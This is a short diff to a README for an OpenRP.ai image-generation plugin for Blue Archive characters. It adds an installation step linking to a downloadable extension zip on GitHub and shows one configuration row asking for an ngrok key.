@@ -24,4 +24,5 @@ A plugin for generating images for Blue Archive Characters in OpenRP.ai.
 | NGROK_KEY | Required. Get from <a href="https://dashboard.ngrok.com/" target="_blank"><img src="https://img.shields.io/badge/NGROK-blue.svg" alt="NGROK"></a> |
 ---
 
-
+## Installation
+1. **Download**: Click [**➡️ Download OpenRP Extension (.zip)**](https://github.com/kirisu-dev/OpenRP-Image-Gen-Plugin/raw/main/OpenRP%20Extension.zip) to download the extension, then extract/unzip it on your computer.
